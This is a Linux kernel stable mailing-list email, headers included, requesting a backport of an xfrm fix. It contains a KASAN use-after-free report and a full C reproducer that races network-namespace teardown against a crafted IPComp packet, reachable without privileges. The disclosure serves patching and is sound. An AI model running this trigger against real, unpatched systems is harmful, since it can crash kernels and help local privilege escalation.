Return-Path: <stable+bounces-197651-lists+stable=lfdr.de@vger.kernel.org>
X-Original-To: lists+stable@lfdr.de
Delivered-To: lists+stable@lfdr.de
Received: from ams.mirrors.kernel.org (ams.mirrors.kernel.org [213.196.21.55])
	by mail.lfdr.de (Postfix) with ESMTPS id 4F352C94677
	for <lists+stable@lfdr.de>; Sat, 29 Nov 2025 19:25:38 +0100 (CET)
Received: from smtp.subspace.kernel.org (relay.kernel.org [52.25.139.140])
	(using TLSv1.2 with cipher ECDHE-ECDSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by ams.mirrors.kernel.org (Postfix) with ESMTPS id 6CFB43449AC
	for <lists+stable@lfdr.de>; Sat, 29 Nov 2025 18:25:37 +0000 (UTC)
Received: from localhost.localdomain (localhost.localdomain [127.0.0.1])
	by smtp.subspace.kernel.org (Postfix) with ESMTP id E698F30FF3A;
	Sat, 29 Nov 2025 18:25:30 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b="kybknhyE"
X-Original-To: stable@vger.kernel.org
Received: from mail-pl1-f196.google.com (mail-pl1-f196.google.com [209.85.214.196])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id CF82B23EABC
	for <stable@vger.kernel.org>; Sat, 29 Nov 2025 18:25:28 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.214.196
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1764440730; cv=none; b=Hpl4oK9WsTeC1mEXsfIKzrP3c2WNW7kQqQwNRQXoFwjvtlcxegAkElBvYswVRGnbMtMe3icWMHTNygdpMUC6NzSX+kTZwjdqvL39DJh87j/brAd4AyQmAHBtU/J2jjgXqeaAJrErvAqVCK6w8ug3bm6PZuLxI4Tej5GOfoliyTk=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1764440730; c=relaxed/simple;
	bh=yX7FyGEjBzCDDLTVYRAdPld2aSjaw1vranOMD3WQ4dg=;
	h=From:To:Cc:Subject:Date:Message-ID:In-Reply-To:References:
	 MIME-Version:Content-Type; b=KWWOyfgwRxbRcV/Y9hp0l17se64pTDWzQdo6X2Hmf6ksdHNo7uU1l6y6dqeLS4ZwUXDcYuYgjXn+ul5ogzWKENovUcgiHS5TwthNn6TILMAImHwHEIEEbAhd9xfJH6H1BDZ2oyFv4jpah7a/N5zz0MTKTbZt1G5FRxNm8zho2j4=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com; spf=pass smtp.mailfrom=gmail.com; dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b=kybknhyE; arc=none smtp.client-ip=209.85.214.196
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
Received: by mail-pl1-f196.google.com with SMTP id d9443c01a7336-2956d816c10so32105235ad.1
        for <stable@vger.kernel.org>; Sat, 29 Nov 2025 10:25:28 -0800 (PST)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20230601; t=1764440728; x=1765045528; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:references:in-reply-to
         :message-id:date:subject:cc:to:from:from:to:cc:subject:date
         :message-id:reply-to;
        bh=ebxbjBnV5fKcxmvW8BYXO1Qi+ZZog3vTbFj0NDKh9SE=;
        b=kybknhyExkm4hl+PZtHU91pfuMpcsQdKOE9epfpn9nY97t8DYkKh8ggCQHsn9eobjj
         rVt7nY5B/iwuyUY25E93s4+2LswNhHHKg9wcsVg6/EPGrrJ23mtSZF+MY4LnlhxpRBQ8
         kPDL8YQPuD39tDbA8Pi1w0sm+yZGWH5aS/c3mDKTsogzposat0zgBEQZZ5pWM70TnOQV
         DtevVFMq92cWJTBtFD7yM6bmGN0nrYRu8/Do0A8VTTghEXiX+x79nHWdbM42xWrPXP0a
         pHtUWTVKVDgrMDJ02U1LhWX9dePu/FbBkN2CGRD1weYF3G2Vv4T4t2ehJjdBHCUpS5Uk
         vLDg==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20230601; t=1764440728; x=1765045528;
        h=content-transfer-encoding:mime-version:references:in-reply-to
         :message-id:date:subject:cc:to:from:x-gm-gg:x-gm-message-state:from
         :to:cc:subject:date:message-id:reply-to;
        bh=ebxbjBnV5fKcxmvW8BYXO1Qi+ZZog3vTbFj0NDKh9SE=;
        b=MPnIrv6ABIxjSUZ9XC0iDyfthBh3wI45mJ3jDSSmEL1eBYpA+3/FPdbv4gc5caRuFL
         vrmtWe6NuoB7bnkvOGHlGM3+3pLyoilVzAcwWiVKQ5Xxvivxq656zDBltLf5aKJDEXe2
         74XKNCnQ1CH6SucCT+6zQIVS4ykn+HFbg19sb3yXZ3j1RJjAEORQH/aRzcmyIEL/lR/X
         Yyvzjk9qy46XSOupquifTa20FDYmLYUlgCXgbk6lGM5AHDhrkC5VQ3tPIRhnqwL6je5+
         l8TMrDh0VjYJfKWTqg0NkQ16fZzK88ladRsUDn0T5FFA+y/Yeu/Nk7IGfN0GfW1l/2JU
         D6nQ==
X-Gm-Message-State: AOJu0YwLWKYhpB4xZpald036R4a4sGuJtLTXU60mUln3ZH+66rjCRnzb
	jGC0hzT6bw6cnhTy1U75HJkerk/Zd3W8BtC0STeNqSN6qXyU3c4GiKPx1AYtfO8aBPid1Q==
X-Gm-Gg: ASbGncvbuYo0nliu3tLxhmsTkdIGLD6Me11WbcmQAfyDAcQ9l5OEmLwXiJNUkhpGJFc
	HXk1yrxAMjglciHbdd0Cbww4+D3lXfqwhEOYLyflSHq21qM1FzjvziUndlvlYLhHZpGHpoutHgL
	d5jVlMDPQBvq2WpOAZCkURR5tfXuOIdoF+/+cralZ2nql8s6m/hbrLAdiigYjGzBbC3DJIs/ii6
	l/LTNforpjOPIqpXfx/pVY8Rt7/jXL2tyjWXf/LtBCd9ISZnDUjkF1SGjqr5aDpmr+v+11J04lQ
	UMHgVLIDqfSRxGdaSpaqn0yluApaCvtDPBEICNqIIYYJ8GzanuBROta9qlvVdhVdgRsTe/l1GXK
	Lwq/SjVo9N5m/nImUmk0IaV73LAUsuI7K8V3izE7uZp04hUZd3foOAXnMmD4IdMrcZH55jiz2Sx
	ezqJHIMtxaBu7h30qO67a1pSuyi4ns9oksqsZuomc/OA==
X-Google-Smtp-Source: AGHT+IGJkBnGmwDrCPAo3f764kr3gvKFx/B07wBfxE6SHU6uOU25jmfL9+fJU1I4Dr2rtVJVpZgRug==
X-Received: by 2002:a17:902:f60f:b0:295:5864:8009 with SMTP id d9443c01a7336-29b6bf5c885mr334019985ad.44.1764440727420;
        Sat, 29 Nov 2025 10:25:27 -0800 (PST)
Received: from DESKTOP-Q6PJO4M.localdomain ([221.228.238.82])
        by smtp.gmail.com with ESMTPSA id d9443c01a7336-29bceb29fbbsm77747035ad.49.2025.11.29.10.25.23
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Sat, 29 Nov 2025 10:25:26 -0800 (PST)
From: Slavin Liu <slavin452@gmail.com>
To: stable@vger.kernel.org
Cc: Sabrina Dubroca <sd@queasysnail.net>,
	Steffen Klassert <steffen.klassert@secunet.com>,
	"netdev@vger.kernel.org" <netdev@vger.kernel.org>
Subject: Re: [BUG] Missing backport for commit b441cf3f8c4b ("xfrm: delete= x->tunnel as we delete x")
Date: Sun, 30 Nov 2025 02:24:07 +0800
Message-ID: <20251129182407.1064-1-slavin452@gmail.com>
X-Mailer: git-send-email 2.43.0
In-Reply-To: <20251118151140.89427-1-slavin452@gmail.com>
References: <20251118151140.89427-1-slavin452@gmail.com>
Precedence: bulk
X-Mailing-List: stable@vger.kernel.org
List-Id: <stable.vger.kernel.org>
List-Subscribe: <mailto:stable+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:stable+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: 8bit

Hi all,

Just a gentle follow-up on this backport request with kasan report and 
reproducer.

KASAN Report:
BUG: KASAN: slab-use-after-free in __hlist_del include/linux/list.h:988=
 [inline]
BUG: KASAN: slab-use-after-free in hlist_del_rcu include/linux/rculist.h:=
516 [inline]
BUG: KASAN: slab-use-after-free in __xfrm_state_delete+0x7bb/0x8e0 =
net/xfrm/xfrm_state.c:761
Write of size 8 at addr ffff88802eba0418 by task kworker/0:5/397627

CPU: 0 UID: 0 PID: 397627 Comm: kworker/0:5 Tainted: 6.12.51 #2
Tainted: [W]=WARN
Workqueue: events xfrm_state_gc_task
Call Trace:
 <TASK>
 __dump_stack lib/dump_stack.c:94 [inline]
 dump_stack_lvl+0xd7/0x130 lib/dump_stack.c:120
 print_address_description mm/kasan/report.c:377 [inline]
 print_report+0xc4/0x640 mm/kasan/report.c:481
 kasan_report+0xd8/0x110 mm/kasan/report.c:594
 __hlist_del include/linux/list.h:988 [inline]
 hlist_del_rcu include/linux/rculist.h:516 [inline]
 __xfrm_state_delete+0x7bb/0x8e0 net/xfrm/xfrm_state.c:761
 xfrm_state_delete net/xfrm/xfrm_state.c:795 [inline]
 xfrm_state_delete_tunnel+0x17c/0x1b0 net/xfrm/xfrm_state.c:3014
 ipcomp_destroy+0x4a/0xc0 net/xfrm/xfrm_ipcomp.c:318
 ___xfrm_state_destroy+0x252/0x5c0 net/xfrm/xfrm_state.c:549
 xfrm_state_gc_task+0x111/0x180 net/xfrm/xfrm_state.c:572
 process_one_work+0x8e3/0x1930 kernel/workqueue.c:3229
 process_scheduled_works kernel/workqueue.c:3310 [inline]
 worker_thread+0x781/0x10a0 kernel/workqueue.c:3391
 kthread+0x2fa/0x400 kernel/kthread.c:389
 ret_from_fork+0x4a/0x80 arch/x86/kernel/process.c:152
 ret_from_fork_asm+0x1a/0x30 arch/x86/entry/entry_64.S:244
 </TASK>

Allocated by task 9:
 kasan_save_stack+0x33/0x60 mm/kasan/common.c:47
 kasan_save_track+0x14/0x30 mm/kasan/common.c:68
 poison_kmalloc_redzone mm/kasan/common.c:377 [inline]
 __kasan_kmalloc+0x8f/0xa0 mm/kasan/common.c:394
 kasan_kmalloc include/linux/kasan.h:260 [inline]
 __do_kmalloc_node mm/slub.c:4313 [inline]
 __kmalloc_noprof+0x219/0x530 mm/slub.c:4325
 kmalloc_noprof include/linux/slab.h:882 [inline]
 kzalloc_noprof include/linux/slab.h:1014 [inline]
 xfrm_hash_alloc+0xd6/0x100 net/xfrm/xfrm_hash.c:21
 xfrm_hash_resize+0x66/0x2310 net/xfrm/xfrm_state.c:170
 [...]

Freed by task 30:
 kasan_save_stack+0x33/0x60 mm/kasan/common.c:47
 kasan_save_track+0x14/0x30 mm/kasan/common.c:68
 kasan_save_free_info+0x3b/0x60 mm/kasan/generic.c:579
 poison_slab_object mm/kasan/common.c:247 [inline]
 __kasan_slab_free+0x37/0x50 mm/kasan/common.c:264
 kasan_slab_free include/linux/kasan.h:233 [inline]
 slab_free_hook mm/slub.c:2374 [inline]
 slab_free mm/slub.c:4632 [inline]
 kfree+0x14a/0x4a0 mm/slub.c:4780
 xfrm_hash_free+0xc1/0xe0 net/xfrm/xfrm_hash.c:35
 xfrm_state_fini+0x226/0x310 net/xfrm/xfrm_state.c:3233
 xfrm_net_exit+0x32/0x70 net/xfrm/xfrm_policy.c:4342
 ops_exit_list+0xb5/0x180 net/core/net_namespace.c:173
 cleanup_net+0x5b8/0xb20 net/core/net_namespace.c:642
 [...]

2. Reproducer
The C reproducer is pasted below.

Given that this UAF is reproducible and reachable from unprivileged=
 namespaces (if unshare is allowed), I suggest backporting commit =
 b441cf3f8c4b to all active LTS branches.

Thanks,
Slavin Liu

---
repro.c:

// gcc repro.c -o poc -lz
#define _GNU_SOURCE
#include <arpa/inet.h>
#include <errno.h>
#include <fcntl.h>
#include <linux/netlink.h>
#include <linux/rtnetlink.h>
#include <linux/xfrm.h>
#include <net/if.h>
#include <netinet/in.h>
#include <sched.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>
#include <netinet/ip.h>
#include <zlib.h>

// =-=-=-=-=-=-=-= CONFIG =-=-=-=-=-=-=-=
#define SPI 0x1100
#define TUNNEL_SRC "172.16.22.148"
#define TUNNEL_DST "172.16.194.141"

// =-=-=-=-=-=-=-= UTILS =-=-=-=-=-=-=-=
#define die(msg) do { perror(msg); exit(EXIT_FAILURE); } while(0)

void write_file(const char * filename, const char * buf) {
    int fd = open(filename, O_WRONLY | O_CLOEXEC);
    if (fd < 0) die("open");
    if (write(fd, buf, strlen(buf)) != strlen(buf)) die("write");
    close(fd);
}

/*
 * Create a new user and network namespace.
 * This allows an unprivileged user to configure XFRM interfaces and rules.
 */
static void init_namespace() {
    char uid_map[128];
    char gid_map[128];
    uid_t uid = getuid();
    gid_t gid = getgid();

    if (unshare(CLONE_NEWUSER | CLONE_NEWNS | CLONE_NEWNET | CLONE_NEWIPC))
        die("unshare");

    sprintf(uid_map, "0 %d 1\n", uid); 
    sprintf(gid_map, "0 %d 1\n", gid);

    write_file("/proc/self/uid_map", uid_map);
    write_file("/proc/self/setgroups", "deny");
    write_file("/proc/self/gid_map", gid_map);
}

static void bring_interface_up(const char *ifname)
{
    int sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0) die("socket");

    struct ifreq ifr;
    memset(&ifr, 0, sizeof ifr);
    strncpy(ifr.ifr_name, ifname, IFNAMSIZ - 1);
    if (ioctl(sockfd, SIOCSIFFLAGS, &ifr) < 0) die("SIOCGIFFLAGS");
    ifr.ifr_flags |= IFF_UP;
    if (ioctl(sockfd, SIOCSIFFLAGS, &ifr) < 0) die("SIOCSIFFLAGS");
    close(sockfd);
}

// =-=-=-=-=-=-=-= XFRM UTILS =-=-=-=-=-=-=-=
int nlfd;

/*
 * Helper to add IP addresses using netlink
 */
int add_ip_address(const char *ifname, const char *ip, int prefix_len) {
    struct {
        struct nlmsghdr n;
        struct ifaddrmsg ifa;
        char buf[256];
    } req;
    
    struct sockaddr_nl nladdr;
    struct rtattr *rta;
    int sockfd;
    int ifindex;
    struct in_addr addr;
    
    ifindex = if_nametoindex(ifname);
    if (ifindex == 0) die("if_nametoindex");
    
    if (inet_pton(AF_INET, ip, &addr) != 1)
        die("Invalid IP address");
    
    sockfd = socket(AF_NETLINK, SOCK_RAW, NETLINK_ROUTE);
    if (sockfd < 0) die("socket");
    
    memset(&req, 0, sizeof(req));
    req.n.nlmsg_len = NLMSG_LENGTH(sizeof(struct ifaddrmsg));
    req.n.nlmsg_flags = NLM_F_REQUEST | NLM_F_CREATE | NLM_F_EXCL | NLM_F_ACK;
    req.n.nlmsg_type = RTM_NEWADDR;
    
    req.ifa.ifa_family = AF_INET;
    req.ifa.ifa_prefixlen = prefix_len;
    req.ifa.ifa_flags = IFA_F_PERMANENT;
    req.ifa.ifa_scope = RT_SCOPE_UNIVERSE;
    req.ifa.ifa_index = ifindex;
    
    rta = (struct rtattr *)(((char *)&req) + NLMSG_ALIGN(req.n.nlmsg_len));
    rta->rta_type = IFA_LOCAL;
    rta->rta_len = RTA_LENGTH(sizeof(addr));
    memcpy(RTA_DATA(rta), &addr, sizeof(addr));
    req.n.nlmsg_len = NLMSG_ALIGN(req.n.nlmsg_len) + rta->rta_len;
    
    memset(&nladdr, 0, sizeof(nladdr));
    nladdr.nl_family = AF_NETLINK;
    
    if (sendto(sockfd, &req, req.n.nlmsg_len, 0,
               (struct sockaddr *)&nladdr, sizeof(nladdr)) < 0) 
        die("sendto");
    
    char buf[4096];
    struct nlmsghdr *nlh = (struct nlmsghdr *)buf;
    int len = recv(sockfd, buf, sizeof(buf), 0);
    
    if (len < 0) die("recv");
    
    if (nlh->nlmsg_type == NLMSG_ERROR) {
        struct nlmsgerr *err = (struct nlmsgerr *)NLMSG_DATA(nlh);
        if (err->error != 0)
            die("Netlink error");
    }
    
    close(sockfd);
    return 0;
}

static void configure_lo()
{
    add_ip_address("lo", "10.0.0.0", 8);
    add_ip_address("lo", "172.16.0.0", 12);
    
    write_file("/proc/sys/net/ipv4/conf/lo/rp_filter", "0");
    write_file("/proc/sys/net/ipv4/conf/all/rp_filter", "0");
    
    write_file("/proc/sys/net/ipv4/conf/lo/accept_local", "1");
    write_file("/proc/sys/net/ipv4/conf/all/accept_local", "1");

    // Enable xfrm on lo to allow IPComp processing
    write_file("/proc/sys/net/ipv4/conf/lo/disable_xfrm", "0\n");
    write_file("/proc/sys/net/ipv4/conf/lo/disable_policy", "0\n");
}

static int nl_open_xfrm(void)
{
    int fd = socket(AF_NETLINK, SOCK_RAW, NETLINK_XFRM);
    if (fd < 0) die("socket");
    
    struct sockaddr_nl addr = { 
        .nl_family = AF_NETLINK, 
        .nl_pid = (uint32_t)getpid() 
    };
    if (bind(fd, (struct sockaddr *)&addr, sizeof(addr)) < 0) die("bind");
    
    struct sockaddr_nl kern = { 
        .nl_family = AF_NETLINK,
        .nl_pid = 0
    };
    if (connect(fd, (struct sockaddr *)&kern, sizeof(kern)) < 0) die("connect");
    
    return fd;
}

/*
 * Constructs an IPComp XFRM state in Tunnel Mode.
 * CRITICAL: This causes the kernel to allocate 'x->tunnel'.
 */
static void xfrm_add_sa_tunnel_ipcomp_v4(uint32_t saddr_be, 
                uint32_t daddr_be, uint32_t spi_be, 
                uint32_t tunnel_src_be, uint32_t tunnel_dst_be)
{
    char req[NLMSG_SPACE(sizeof(struct xfrm_usersa_info)) +
             NLA_ALIGN(NLA_HDRLEN + sizeof(struct xfrm_algo) + 0)];
    memset(req, 0, sizeof(req));

    struct nlmsghdr *nlh = (struct nlmsghdr *)req;
    struct xfrm_usersa_info *sa = (struct xfrm_usersa_info *)NLMSG_DATA(nlh);

    nlh->nlmsg_len   = NLMSG_LENGTH(sizeof(*sa));
    nlh->nlmsg_type  = XFRM_MSG_NEWSA;
    nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK | NLM_F_CREATE | NLM_F_EXCL;
    nlh->nlmsg_seq   = 1;
    nlh->nlmsg_pid   = (uint32_t)getpid();

    memset(sa, 0, sizeof(*sa));
    sa->id.proto = IPPROTO_COMP;
    sa->id.spi   = spi_be;
    sa->mode     = XFRM_MODE_TUNNEL;
    sa->id.daddr.a4 = tunnel_dst_be;
    sa->saddr.a4     = tunnel_src_be;
    sa->sel.family      = AF_INET;
    sa->sel.daddr.a4    = daddr_be;
    sa->sel.saddr.a4    = saddr_be;
    sa->sel.prefixlen_d = 32;
    sa->sel.prefixlen_s = 32;
    sa->family        = AF_INET;
    sa->replay_window = 0;
    sa->lft.soft_byte_limit          = sa->lft.hard_byte_limit          = XFRM_INF;
    sa->lft.soft_packet_limit        = sa->lft.hard_packet_limit        = XFRM_INF;
    sa->lft.soft_add_expires_seconds = sa->lft.hard_add_expires_seconds = XFRM_INF;
    sa->lft.soft_use_expires_seconds = sa->lft.hard_use_expires_seconds = XFRM_INF;

    struct nlattr *nla = (struct nlattr *)((char*)nlh + NLMSG_ALIGN(nlh->nlmsg_len));
    struct xfrm_algo *algo = (struct xfrm_algo *)((char*)nla + NLA_HDRLEN);

    nla->nla_type = XFRMA_ALG_COMP;
    nla->nla_len  = NLA_HDRLEN + sizeof(*algo);

    memset(algo, 0, sizeof(*algo));
    snprintf(algo->alg_name, sizeof(algo->alg_name), "%s", "deflate");
    algo->alg_key_len = 0;

    nlh->nlmsg_len = NLMSG_ALIGN(nlh->nlmsg_len) + NLA_ALIGN(nla->nla_len);

    if (send(nlfd, nlh, nlh->nlmsg_len, 0) < 0)
        die("send");
}

void setup_xfrm_env() {
    init_namespace();
    bring_interface_up("lo");
    configure_lo();
    nlfd = nl_open_xfrm();
    if (nlfd < 0) die("nl_open_xfrm");
}

// =-=-=-=-=-=-=-= PACKET CONSTRUCTION =-=-=-=-=-=-=-=

uint16_t ip_checksum(struct iphdr *iph) {
    uint32_t sum = 0;
    uint16_t *ptr = (uint16_t*)iph;
    int len = iph->ihl * 4;
    
    while (len > 1) {
        sum += *ptr++;
        len -= 2;
    }
    if (len == 1)
        sum += *(uint8_t*)ptr;
    
    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    return ~sum;
}

struct ipcomp_hdr {
    uint8_t  nexthdr;
    uint8_t  flags;
    uint16_t cpi;
};

static int deflate_raw(const void *in, size_t in_len, void *out, size_t *out_len)
{
    z_stream strm;
    memset(&strm, 0, sizeof(strm));
    int ret = deflateInit2(&strm,
                           Z_DEFAULT_COMPRESSION,
                           Z_DEFLATED,
                           -15,                 // raw deflate (no zlib header)
                           8,
                           Z_DEFAULT_STRATEGY);
    if (ret != Z_OK) return -1;

    strm.next_in  = (Bytef *)in;
    strm.avail_in = (uInt)in_len;
    strm.next_out = (Bytef *)out;
    strm.avail_out= (uInt)*out_len;

    ret = deflate(&strm, Z_FINISH);
    if (ret != Z_STREAM_END) {
        deflateEnd(&strm);
        return -1;
    }

    *out_len = strm.total_out;
    deflateEnd(&strm);
    return 0;
}

static size_t build_inner_ipv4_packet(uint8_t *buf, size_t buf_cap,
                                      const char *src, const char *dst,
                                      uint16_t id, uint8_t proto,
                                      uint16_t frag_flags_off,
                                      const void *payload, size_t payload_len)
{
    if (buf_cap < sizeof(struct iphdr) + payload_len) return 0;

    struct iphdr *iph = (struct iphdr *)buf;
    memset(iph, 0, sizeof(*iph));
    iph->version  = 4;
    iph->ihl      = 5;
    iph->tos      = 0;
    iph->tot_len  = htons(sizeof(struct iphdr) + payload_len);
    iph->id       = htons(id);
    iph->frag_off = htons(frag_flags_off);
    iph->ttl      = 64;
    iph->protocol = proto;
    iph->saddr    = inet_addr(src);
    iph->daddr    = inet_addr(dst);
    iph->check    = 0;
    iph->check    = ip_checksum(iph);

    memcpy(buf + sizeof(struct iphdr), payload, payload_len);
    return sizeof(struct iphdr) + payload_len;
}

#define INNER_PAY_SZ 1400

/*
 * Sends a crafted packet:
 * Outer: IP -> IPComp (Tunnel Mode)
 * Inner: IP (Fragmented) -> UDP
 *
 * This forces the packet to enter the reassembly queue (gro_cells_receive)
 * after decompression, holding a ref to the IPComp state.
 */
void trigger_fragment_with_secpath() {
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sock < 0) die("socket");

    int one = 1;
    if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0)
        die("setsockopt IP_HDRINCL");

    // 1. Construct Inner IPv4 Packet (Fragmented: IP_MF set)
    uint8_t inner_payload[INNER_PAY_SZ];
    memset(inner_payload, 0xAA, sizeof(inner_payload));

    const uint16_t INNER_ID = 0x5678;
    const uint16_t INNER_FRAG_OFFSET = 1400;    // bytes
    // Set More Fragments (IP_MF) to ensure it stays in reassembly queue
    const uint16_t inner_frag_off_field = IP_MF | (INNER_FRAG_OFFSET >> 3);

    uint8_t inner_packet[sizeof(struct iphdr) + INNER_PAY_SZ];
    size_t inner_packet_len = build_inner_ipv4_packet(
        inner_packet, sizeof(inner_packet),
        "10.0.0.2", "10.0.0.1",
        INNER_ID, IPPROTO_UDP,
        inner_frag_off_field,
        inner_payload, sizeof(inner_payload)
    );
    if (!inner_packet_len) die("inner packet too big");

    // 2. Compress the inner packet (IPComp payload)
    uint8_t comp_buf[sizeof(inner_packet) + 128];
    size_t  comp_len = sizeof(comp_buf);
    if (deflate_raw(inner_packet, inner_packet_len, comp_buf, &comp_len) != 0) {
        die("deflate_raw failed");
    }

    // 3. Build outer packet: [outer IP][IPCOMP][compressed bytes]
    uint8_t packet[sizeof(struct iphdr) + sizeof(struct ipcomp_hdr) + sizeof(comp_buf)];
    struct iphdr *outer_iph = (struct iphdr *)packet;

    outer_iph->version = 4;
    outer_iph->ihl     = 5;
    outer_iph->tos     = 0;
    size_t outer_len   = sizeof(struct iphdr) + sizeof(struct ipcomp_hdr) + comp_len;
    outer_iph->tot_len = htons(outer_len);
    outer_iph->id      = htons(0x1234);
    outer_iph->frag_off= htons(IP_DF);
    outer_iph->ttl     = 64;
    outer_iph->protocol= IPPROTO_COMP; // Trigger XFRM Input
    outer_iph->saddr   = inet_addr(TUNNEL_SRC);
    outer_iph->daddr   = inet_addr(TUNNEL_DST);
    outer_iph->check   = 0;

    struct ipcomp_hdr *ipcomp = (struct ipcomp_hdr *)(packet + sizeof(struct iphdr));
    ipcomp->nexthdr = IPPROTO_IPIP;    // decompressed payload is an IPv4 packet
    ipcomp->flags   = 0;
    ipcomp->cpi     = htons(SPI);

    memcpy(packet + sizeof(struct iphdr) + sizeof(struct ipcomp_hdr),
           comp_buf, comp_len);

    outer_iph->check = ip_checksum(outer_iph);

    struct sockaddr_in dest = {
        .sin_family = AF_INET,
        .sin_addr.s_addr = inet_addr(TUNNEL_DST)
    };

    if (sendto(sock, packet, outer_len, 0,
               (struct sockaddr*)&dest, sizeof(dest)) < 0) {
        die("sendto");
    }
    close(sock);
}

// =-=-=-=-=-=-=-= MAIN =-=-=-=-=-=-=-=

int main(int argc, char **argv)
{
    printf("[*] Starting UAF Trigger Loop...\n");
    printf("[*] Ctrl+C to stop.\n");

    while (1) {
        // Fork a child process to run the trigger logic
        if (!fork()) {
            // Child Process:
            
            // 1. Create isolated namespace
            setup_xfrm_env();

            uint32_t inner_src = inet_addr("10.0.0.1");
            uint32_t inner_dst = inet_addr("10.0.0.2");
            uint32_t tunnel_src = inet_addr(TUNNEL_SRC);
            uint32_t tunnel_dst = inet_addr(TUNNEL_DST);
            uint32_t spi = htonl(SPI);
            
            // 2. Add IPComp State (allocates x->tunnel)
            xfrm_add_sa_tunnel_ipcomp_v4(inner_src, inner_dst, spi, 
                                         tunnel_src, tunnel_dst);
            
            // 3. Send packet to sit in reassembly queue (holds ref to xfrm_state)
            trigger_fragment_with_secpath();
            
            // 4. Exit immediately. 
            // This triggers netns teardown:
            // -> ipv4_frags_exit_net (stops reassembly, schedules free work)
            // -> xfrm_net_exit (flushes state, freeing xfrm_hash)
            // If xfrm_state_fini() happens before skb in reassembly get 
            // destroyed -> UAF.
            exit(0);
        }
        
        // Wait for child's netns cleanup to finish
        waitpid(-1, NULL, 0);
        sleep(1); 
    }

    return 0;
}

